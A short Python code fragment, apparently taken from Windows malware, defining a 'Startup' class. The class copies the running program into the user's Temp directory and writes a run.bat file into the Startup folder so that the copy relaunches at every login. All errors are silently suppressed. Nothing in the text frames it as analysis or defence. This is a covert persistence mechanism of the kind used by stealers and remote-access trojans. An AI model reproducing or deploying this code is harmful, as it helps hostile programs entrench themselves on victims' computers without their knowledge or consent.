class Startup:

    def __init__(self):
        self.file = sys.argv[0]
        ext = self.file.split("\\")[-1].split(".")[-1]
        name = self.file.split("\\")[-1].split(".")[0]
        self._startup(ext,name)

    def _startup(self,e,n):
        try:
            if os.path.exists(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}'):
                pass
            else:
                with open(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}', 'wb') as f:
                    f.write(open(self.file, 'rb').read())
                open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.bat","w+").write(fr"""start C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}""")
        except:pass